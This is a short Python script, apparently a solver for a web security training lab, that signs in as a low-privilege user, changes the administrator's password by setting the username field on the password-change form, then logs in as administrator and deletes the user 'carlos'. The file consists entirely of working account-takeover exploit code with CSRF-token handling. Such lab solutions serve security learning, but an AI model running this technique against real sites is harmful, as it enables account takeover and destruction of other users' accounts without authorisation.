import requests
import re
import sys


class LabSolver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()
        self.email_client = None

    def get_csrf_token(self, path):
        response = self.session.get(self.lab_url + path)
        return re.search('name="csrf" value="(.*)"', response.text).group(1)

    def sign_in_as_wiener(self):
        data = {
            'csrf': self.get_csrf_token('login'),
            'username': 'wiener',
            'password': 'peter'
        }
        self.session.post(self.lab_url + 'login', data=data)

    def change_admin_password(self):
        data = {
            'csrf': self.get_csrf_token('my-account'),
            'username': 'administrator',
            'new-password-1': 'hacker',
            'new-password-2': 'hacker'
        }
        self.session.post(self.lab_url + 'my-account/change-password', data=data)

    def sign_in_as_administrator_and_delete_carlos(self):
        data = {
            'csrf': self.get_csrf_token('login'),
            'username': 'administrator',
            'password': 'hacker'
        }
        self.session.post(self.lab_url + 'login', data=data)
        self.session.get(self.lab_url + 'admin/delete?username=carlos')

    def checking_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.sign_in_as_wiener()
        self.change_admin_password()
        self.sign_in_as_administrator_and_delete_carlos()
        self.checking_solution()


lab_solver = LabSolver(sys.argv[1])
lab_solver.solve()
